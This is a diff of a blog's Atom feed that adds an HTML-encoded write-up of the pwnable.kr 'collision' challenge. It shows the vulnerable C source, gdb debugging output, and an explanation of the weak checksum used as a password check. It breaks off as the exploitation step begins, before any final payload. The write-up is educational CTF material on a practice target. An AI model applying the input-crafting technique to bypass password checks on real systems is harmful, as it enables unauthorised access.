@@ -1,4 +1,441 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-24T15:23:14+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Unattended</title><link href="http://localhost:4000/hack-the-box/unattended/" rel="alternate" type="text/html" title="Hack The Box - Unattended" /><published>2019-08-24T00:00:00+02:00</published><updated>2019-08-24T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/unattended</id><content type="html" xml:base="http://localhost:4000/hack-the-box/unattended/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-08-28T00:54:34+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">pwnable.kr - collision</title><link href="http://localhost:4000/pwn/collision/" rel="alternate" type="text/html" title="pwnable.kr - collision" /><published>2019-08-28T00:00:00+02:00</published><updated>2019-08-28T00:00:00+02:00</updated><id>http://localhost:4000/pwn/collision</id><content type="html" xml:base="http://localhost:4000/pwn/collision/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;introduction&quot;&gt;Introduction&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-this-is-my-write-up-for-a-challenge-called-collision-from-pwnablekr-its-a-very-simple-challenge-we-need-a-password-to-make-the-program-read-the-flag-the-function-that-validates-the-given-password-is-vulnerable-to-hash-collision-so-we-will-exploit-it&quot;&gt;Hey guys this is my write-up for a challenge called &lt;code class=&quot;highlighter-rouge&quot;&gt;collision&lt;/code&gt; from &lt;a href=&quot;http://pwnable.kr/&quot;&gt;pwnable.kr&lt;/a&gt;. It’s a very simple challenge, we need a password to make the program read the flag, the function that validates the given password is vulnerable to hash collision so we will exploit it.&lt;/h4&gt;
+&lt;h4 id=&quot;challenge-description-&quot;&gt;Challenge Description :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Daddy told me about cool MD5 hash collision today.
+I wanna do something like that too!
+
+ssh col@pwnable.kr -p2222 (pw:guest)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;/images/pwn/collision/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;code-analysis-tests&quot;&gt;Code Analysis, Tests&lt;/h3&gt;
+&lt;h4 id=&quot;colc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;col.c&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+unsigned long hashcode = 0x21DD09EC;
+unsigned long check_password(const char* p){
+	int* ip = (int*)p;
+	int i;
+	int res=0;
+	for(i=0; i&amp;lt;5; i++){
+		res += ip[i];
+	}
+	return res;
+}
+
+int main(int argc, char* argv[]){
+	if(argc&amp;lt;2){
+		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
+		return 0;
+	}
+	if(strlen(argv[1]) != 20){
+		printf(&quot;passcode length should be 20 bytes\n&quot;);
+		return 0;
+	}
+
+	if(hashcode == check_password( argv[1] )){
+		system(&quot;/bin/cat flag&quot;);
+		return 0;
+	}
+	else
+		printf(&quot;wrong passcode.\n&quot;);
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;main-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt; :&lt;/h4&gt;
+
+&lt;h4 id=&quot;starting-by-the-main-function-it-checks-if-we-have-given-the-program-an-input-and-it-checks-if-our-inputs-length-is-exactly-20-bytes-then-it-checks-if-the-return-value-of-check_passwordour-input-is-equal-to-hashcode-if-we-pass-that-check-it-will-read-the-flag-otherwise-it-will-print-wrong-passcode-and-exit&quot;&gt;Starting by the main function it checks if we have given the program an input and it checks if our input’s length is exactly 20 bytes. Then it checks if the return value of &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password(our input)&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcode&lt;/code&gt;, if we pass that check it will read the flag, otherwise it will print &lt;code class=&quot;highlighter-rouge&quot;&gt;wrong passcode.&lt;/code&gt; and exit.&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;int main(int argc, char* argv[]){
+	if(argc&amp;lt;2){
+		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
+		return 0;
+	}
+	if(strlen(argv[1]) != 20){
+		printf(&quot;passcode length should be 20 bytes\n&quot;);
+		return 0;
+	}
+
+	if(hashcode == check_password( argv[1] )){
+		system(&quot;/bin/cat flag&quot;);
+		return 0;
+	}
+	else
+		printf(&quot;wrong passcode.\n&quot;);
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;looking-up-we-can-see-the-declaration-of-the-variable-hashcode--&quot;&gt;Looking up, we can see the declaration of the variable &lt;code class=&quot;highlighter-rouge&quot;&gt;hashcode&lt;/code&gt;  :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned long hashcode = 0x21DD09EC;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;thats-a-hex-value-lets-convert-it-to-decimal-with-python-&quot;&gt;That’s a hex value, let’s convert it to decimal with python :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 0x21DD09EC
+568134124
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;so-we-need-our-input-to-be-20-bytes-length-and-we-also-need-to-make-the-function-check_password-return-568134124-when-our-input-is-given-to-it&quot;&gt;So we need our input to be 20 bytes length and we also need to make the function &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password&lt;/code&gt; return &lt;code class=&quot;highlighter-rouge&quot;&gt;568134124&lt;/code&gt; when our input is given to it.&lt;/h4&gt;
+&lt;h4 id=&quot;lets-quickly-try-to-simulate-that-in-gdb&quot;&gt;Let’s quickly try to simulate that in &lt;code class=&quot;highlighter-rouge&quot;&gt;gdb&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;i-ran-the-program-and-set-a-breakpoint-at-main-&quot;&gt;I ran the program and set a breakpoint at main :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  break main                                                                                                                                                                                         
+Breakpoint 1 at 0x11b3                                                                                                                                                                                   
+gef➤  r &quot;AAAAAAAAAAAAAAAAAAAA&quot;
+Starting program: /root/Desktop/pwnable.kr/collision/col &quot;AAAAAAAAAAAAAAAAAAAA&quot;
+
+Breakpoint 1, 0x00005555555551b3 in main ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x00005555555551af  →  &amp;lt;main+0&amp;gt; push rbp
+$rbx   : 0x0 
+$rcx   : 0x00007ffff7fa9718  →  0x00007ffff7faad80  →  0x0000000000000000
+$rdx   : 0x00007fffffffe160  →  0x00007fffffffe48b  →  &quot;SHELL=/bin/bash&quot;
+$rsp   : 0x00007fffffffe060  →  0x0000555555555260  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+$rbp   : 0x00007fffffffe060  →  0x0000555555555260  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+$rsi   : 0x00007fffffffe148  →  0x00007fffffffe44f  →  &quot;/root/Desktop/pwnable.kr/collision/col&quot;
+$rdi   : 0x2                                                                                                           
+$rip   : 0x00005555555551b3  →  &amp;lt;main+4&amp;gt; sub rsp, 0x10
+$r8    : 0x00007ffff7faad80  →  0x0000000000000000
+$r9    : 0x00007ffff7faad80  →  0x0000000000000000
+$r10   : 0x0
+$r11   : 0x00007ffff7f6b1b0  →  0x0000800003400468
+$r12   : 0x0000555555555080  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+$r13   : 0x00007fffffffe140  →  0x0000000000000002
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe060│+0x0000: 0x0000555555555260  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15  ← $rsp, $rbp
+0x00007fffffffe068│+0x0008: 0x00007ffff7e1209b  →  &amp;lt;__libc_start_main+235&amp;gt; mov edi, eax
+0x00007fffffffe070│+0x0010: 0x0000000000000000
+0x00007fffffffe078│+0x0018: 0x00007fffffffe148  →  0x00007fffffffe44f  →  &quot;/root/Desktop/pwnable.kr/collision/col&quot;
+0x00007fffffffe080│+0x0020: 0x0000000200040000
+0x00007fffffffe088│+0x0028: 0x00005555555551af  →  &amp;lt;main+0&amp;gt; push rbp
+0x00007fffffffe090│+0x0030: 0x0000000000000000
+0x00007fffffffe098│+0x0038: 0xf6e7f80b45a87e3d
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x5555555551ae &amp;lt;check_password+73&amp;gt; ret
+   0x5555555551af &amp;lt;main+0&amp;gt;         push   rbp
+   0x5555555551b0 &amp;lt;main+1&amp;gt;         mov    rbp, rsp
+ → 0x5555555551b3 &amp;lt;main+4&amp;gt;         sub    rsp, 0x10
+   0x5555555551b7 &amp;lt;main+8&amp;gt;         mov    DWORD PTR [rbp-0x4], edi
+   0x5555555551ba &amp;lt;main+11&amp;gt;        mov    QWORD PTR [rbp-0x10], rsi
+   0x5555555551be &amp;lt;main+15&amp;gt;        cmp    DWORD PTR [rbp-0x4], 0x1
+   0x5555555551c2 &amp;lt;main+19&amp;gt;        jg     0x5555555551e6 &amp;lt;main+55&amp;gt;
+   0x5555555551c4 &amp;lt;main+21&amp;gt;        mov    rax, QWORD PTR [rbp-0x10]
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;col&quot;, stopped, reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5555555551b3 → main()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;then-i-set-a-breakpoint-before-the-return-instruction-in-check_password-and-continued-the-execution-&quot;&gt;Then I set a breakpoint before the return instruction in &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password()&lt;/code&gt; and continued the execution :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  disas check_password
+Dump of assembler code for function check_password:
+   0x0000555555555165 &amp;lt;+0&amp;gt;:     push   rbp
+   0x0000555555555166 &amp;lt;+1&amp;gt;:     mov    rbp,rsp
+   0x0000555555555169 &amp;lt;+4&amp;gt;:     mov    QWORD PTR [rbp-0x18],rdi
+   0x000055555555516d &amp;lt;+8&amp;gt;:     mov    rax,QWORD PTR [rbp-0x18]
+   0x0000555555555171 &amp;lt;+12&amp;gt;:    mov    QWORD PTR [rbp-0x10],rax
+   0x0000555555555175 &amp;lt;+16&amp;gt;:    mov    DWORD PTR [rbp-0x8],0x0
+   0x000055555555517c &amp;lt;+23&amp;gt;:    mov    DWORD PTR [rbp-0x4],0x0
+   0x0000555555555183 &amp;lt;+30&amp;gt;:    jmp    0x5555555551a2 &amp;lt;check_password+61&amp;gt;
+   0x0000555555555185 &amp;lt;+32&amp;gt;:    mov    eax,DWORD PTR [rbp-0x4]
+   0x0000555555555188 &amp;lt;+35&amp;gt;:    cdqe
+   0x000055555555518a &amp;lt;+37&amp;gt;:    lea    rdx,[rax*4+0x0]
+   0x0000555555555192 &amp;lt;+45&amp;gt;:    mov    rax,QWORD PTR [rbp-0x10]
+   0x0000555555555196 &amp;lt;+49&amp;gt;:    add    rax,rdx
+   0x0000555555555199 &amp;lt;+52&amp;gt;:    mov    eax,DWORD PTR [rax]
+   0x000055555555519b &amp;lt;+54&amp;gt;:    add    DWORD PTR [rbp-0x8],eax
+   0x000055555555519e &amp;lt;+57&amp;gt;:    add    DWORD PTR [rbp-0x4],0x1
+   0x00005555555551a2 &amp;lt;+61&amp;gt;:    cmp    DWORD PTR [rbp-0x4],0x4
+   0x00005555555551a6 &amp;lt;+65&amp;gt;:    jle    0x555555555185 &amp;lt;check_password+32&amp;gt;
+   0x00005555555551a8 &amp;lt;+67&amp;gt;:    mov    eax,DWORD PTR [rbp-0x8]
+   0x00005555555551ab &amp;lt;+70&amp;gt;:    cdqe
+   0x00005555555551ad &amp;lt;+72&amp;gt;:    pop    rbp
+   0x00005555555551ae &amp;lt;+73&amp;gt;:    ret
+End of assembler dump.
+gef➤  break *0x00005555555551ae
+Breakpoint 2 at 0x5555555551ae
+gef➤  c
+Continuing.
+
+Breakpoint 2, 0x00005555555551ae in check_password ()
+[ Legend: Modified register | Code | Heap | Stack | String ]
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x46464645
+$rbx   : 0x0
+$rcx   : 0x6
+$rdx   : 0x10
+$rsp   : 0x00007fffffffe048  →  0x0000555555555225  →  &amp;lt;main+118&amp;gt; mov rdx, rax
+$rbp   : 0x00007fffffffe060  →  0x0000555555555260  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
+$rsi   : 0x00007fffffffe148  →  0x00007fffffffe44f  →  &quot;/root/Desktop/pwnable.kr/collision/col&quot;
+$rdi   : 0x00007fffffffe476  →  &quot;AAAAAAAAAAAAAAAAAAAA&quot;
+$rip   : 0x00005555555551ae  →  &amp;lt;check_password+73&amp;gt; ret 
+$r8    : 0x400
+$r9    : 0x00007ffff7faad80  →  0x0000000000000000
+$r10   : 0xfffffffffffff479
+$r11   : 0x00007ffff7e861e0  →  &amp;lt;__strlen_sse2+0&amp;gt; pxor xmm0, xmm0
+$r12   : 0x0000555555555080  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
+$r13   : 0x00007fffffffe140  →  0x0000000000000002
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe048│+0x0000: 0x0000555555555225  →  &amp;lt;main+118&amp;gt; mov rdx, rax       ← $rsp
+0x00007fffffffe050│+0x0008: 0x00007fffffffe148  →  0x00007fffffffe44f  →  &quot;/root/Desktop/pwnable.kr/collision/col&quot;
+0x00007fffffffe058│+0x0010: 0x0000000200000000
+0x00007fffffffe060│+0x0018: 0x0000555555555260  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15  ← $rbp
+0x00007fffffffe068│+0x0020: 0x00007ffff7e1209b  →  &amp;lt;__libc_start_main+235&amp;gt; mov edi, eax
+0x00007fffffffe070│+0x0028: 0x0000000000000000
+0x00007fffffffe078│+0x0030: 0x00007fffffffe148  →  0x00007fffffffe44f  →  &quot;/root/Desktop/pwnable.kr/collision/col&quot;
+0x00007fffffffe080│+0x0038: 0x0000000200040000
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x5555555551a1 &amp;lt;check_password+60&amp;gt; add    DWORD PTR [rbx+0x7e04fc7d], eax
+   0x5555555551a7 &amp;lt;check_password+66&amp;gt; fisttp QWORD PTR [rbx-0x67b707bb]
+   0x5555555551ad &amp;lt;check_password+72&amp;gt; pop    rbp
+ → 0x5555555551ae &amp;lt;check_password+73&amp;gt; ret    
+   ↳  0x555555555225 &amp;lt;main+118&amp;gt;       mov    rdx, rax
+      0x555555555228 &amp;lt;main+121&amp;gt;       mov    rax, QWORD PTR [rip+0x2e19]        # 0x555555558048 &amp;lt;hashcode&amp;gt;
+      0x55555555522f &amp;lt;main+128&amp;gt;       cmp    rdx, rax
+      0x555555555232 &amp;lt;main+131&amp;gt;       jne    0x55555555524c &amp;lt;main+157&amp;gt;
+      0x555555555234 &amp;lt;main+133&amp;gt;       lea    rdi, [rip+0xe08]        # 0x555555556043
+      0x55555555523b &amp;lt;main+140&amp;gt;       mov    eax, 0x0
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;col&quot;, stopped, reason: BREAKPOINT
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x5555555551ae → check_password()
+[#1] 0x555555555225 → main()
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;the-return-value-of-check_password-is-saved-in-eax-we-need-it-to-be-568134124-&quot;&gt;The return value of &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password()&lt;/code&gt; is saved in &lt;code class=&quot;highlighter-rouge&quot;&gt;EAX&lt;/code&gt; we need it to be &lt;code class=&quot;highlighter-rouge&quot;&gt;568134124&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  print $eax
+$1 = 0x46464645
+gef➤  set $eax=568134124
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;now-if-we-continue-execution-it-should-attempt-to-execute-bincat-flag-&quot;&gt;Now if we continue execution it should attempt to execute &lt;code class=&quot;highlighter-rouge&quot;&gt;/bin/cat flag&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gef➤  c
+Continuing.
+[Detaching after fork from child process 3166]
+/bin/cat: flag: No such file or directory
+[Inferior 1 (process 3101) exited normally]
+gef➤ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;great-now-we-need-to-find-out-how-to-make-check_password-return-that-value-lets-look-at-the-code&quot;&gt;Great, now we need to find out how to make &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password()&lt;/code&gt; return that value, let’s look at the code.&lt;/h4&gt;
+&lt;h4 id=&quot;check_password-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;check_password()&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;unsigned long check_password(const char* p){
+	int* ip = (int*)p;
+	int i;
+	int res=0;
+	for(i=0; i&amp;lt;5; i++){
+		res += ip[i];
+	}
+	return res;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;this-function-casts-the-given-passcode-p-into-integer-declares-ip-which-is-an-array-of-pointers-starting-with-the-pointer-to-p-and-declares-an-int-variable-called-res-and-gives-it-a-value-of-0-then-it-loops-5-times-through-ip-because-length-of-passcode-is-20-204--5-and-adds-each-value-to-res-finally-it-returns-res&quot;&gt;This function casts the given passcode (&lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt;) into integer, declares &lt;code class=&quot;highlighter-rouge&quot;&gt;ip&lt;/code&gt; which is an &lt;a href=&quot;https://www.tutorialspoint.com/cprogramming/c_array_of_pointers.htm&quot;&gt;array of pointers&lt;/a&gt; starting with the pointer to &lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt;, and declares an &lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt; variable called &lt;code class=&quot;highlighter-rouge&quot;&gt;res&lt;/code&gt; and gives it a value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; then it loops 5 times through &lt;code class=&quot;highlighter-rouge&quot;&gt;ip&lt;/code&gt; (because length of &lt;code class=&quot;highlighter-rouge&quot;&gt;passcode&lt;/code&gt; is 20, &lt;code class=&quot;highlighter-rouge&quot;&gt;20/4 == 5&lt;/code&gt;) and adds each value to &lt;code class=&quot;highlighter-rouge&quot;&gt;res&lt;/code&gt;, finally it returns &lt;code class=&quot;highlighter-rouge&quot;&gt;res&lt;/code&gt;.&lt;/h4&gt;
+&lt;h4 id=&quot;in-case-youre-confused-simply-what-happens-is-that-it-takes-the-given-passcode-which-is-20-bytes-length-and-divides-it-to-5-pieces-each-piece-4-bytes-then-it-sums-the-decimal-value-of-the-5-pieces-and-returns-that-value-for-example-the-result-of-giving-check_password-aaaaaaaaaaaaaaaaaaaa-will-be-like-this-&quot;&gt;In case you’re confused, simply what happens is that it takes the given passcode which is 20 bytes length and divides it to 5 pieces (each piece 4 bytes) then it sums the decimal value of the 5 pieces and returns that value. For example the result of giving &lt;code class=&quot;highlighter-rouge&quot;&gt;check_password()&lt;/code&gt; “AAAAAAAAAAAAAAAAAAAA” will be like this :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&quot;AAAA&quot; + &quot;AAAA&quot; + &quot;AAAA&quot; + &quot;AAAA&quot; + &quot;AAAA&quot;
+0x41414141 + 0x41414141 + 0x41414141 + 0x41414141 + 0x41414141
+1094795585 + 1094795585 + 1094795585 + 1094795585 + 1094795585
+res = 5473977925
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;to-verify-that-i-took-the-main-code-and-added-some-printf-statements-test-code-looks-like-this-&quot;&gt;To verify that I took the main code and added some &lt;code class=&quot;highlighter-rouge&quot;&gt;printf&lt;/code&gt; statements, test code looks like this :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+unsigned long hashcode = 0x21DD09EC;
+unsigned long check_password(const char* p){
+	int* ip = (int*)p;
+	int i;
+	int res=0;
+	for(i=0; i&amp;lt;5; i++){
+		res += ip[i];
+		printf(&quot;\n--------------------------\n&quot;);
+		printf(&quot;loop :  %i\n&quot;, i);
+		printf(&quot;piece value : %i\n&quot;,ip[i] );
+		printf(&quot;\n&quot;);
+	}
+	return res;
+}
+
+int main(int argc, char* argv[]){
+	if(argc&amp;lt;2){
+		printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);
+		return 0;
+	}
+	if(strlen(argv[1]) != 20){
+		printf(&quot;passcode length should be 20 bytes\n&quot;);
+		return 0;
+	}
+	printf(&quot;hashcode : %i\n&quot;, hashcode);
+	if(hashcode == check_password( argv[1] )){
+		system(&quot;/bin/cat flag&quot;);
+		return 0;
+	}
+	else
+		printf(&quot;wrong passcode.\n&quot;);
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;lets-give-it-20-as-&quot;&gt;Let’s give it 20 A’s :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/pwnable.kr/collision/test# ./test &quot;AAAAAAAAAAAAAAAAAAAA&quot;
+hashcode : 568134124
+
+--------------------------
+loop :  0
+piece value : 1094795585
+
+
+--------------------------
+loop :  1
+piece value : 1094795585
+
+
+--------------------------
+loop :  2
+piece value : 1094795585
+
+
+--------------------------
+loop :  3
+piece value : 1094795585
+
+
+--------------------------
+loop :  4
+piece value : 1094795585
+
+wrong passcode.
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;you-can-see-that-the-5-pieces-are-of-the-same-value-which-is-the-value-of-0x41414141-4-as-&quot;&gt;You can see that the 5 pieces are of the same value which is the value of &lt;code class=&quot;highlighter-rouge&quot;&gt;0x41414141&lt;/code&gt; (4 A’s) :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 0x41414141
+1094795585
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;and-if-we-give-it-aaaabbbbccccddddeeee-&quot;&gt;And if we give it &lt;code class=&quot;highlighter-rouge&quot;&gt;AAAABBBBCCCCDDDDEEEE&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/pwnable.kr/collision/test# ./test &quot;AAAABBBBCCCCDDDDEEEE&quot;         
+hashcode : 568134124
+
+--------------------------
+loop :  0
+piece value : 1094795585
+
+
+--------------------------
+loop :  1
+piece value : 1111638594
+
+
+--------------------------
+loop :  2
+piece value : 1128481603
+
+
+--------------------------
+loop :  3
+piece value : 1145324612
+
+
+--------------------------
+loop :  4
+piece value : 1162167621
+
+wrong passcode.
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 0x41414141
+1094795585
+&amp;gt;&amp;gt;&amp;gt; 0x42424242
+1111638594
+&amp;gt;&amp;gt;&amp;gt; 0x43434343
+1128481603
+&amp;gt;&amp;gt;&amp;gt; 0x44444444
+1145324612
+&amp;gt;&amp;gt;&amp;gt; 0x45454545
+1162167621
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
+&lt;h4 id=&quot;we-need-to-come-up-with-5-pieces-that-add-up-to-568134124&quot;&gt;We need to come up with 5 pieces that add up to 568134124.&lt;/h4&gt;
+&lt;h4 id=&quot;we-can-divide-the-original-value-by-5-&quot;&gt;We can divide the original value by 5 :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 568134124/5
+113626824
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;but-568134124-isnt-divisible-by-5-&quot;&gt;But 568134124 isn’t divisible by 5 :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; 568134124%5
+4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
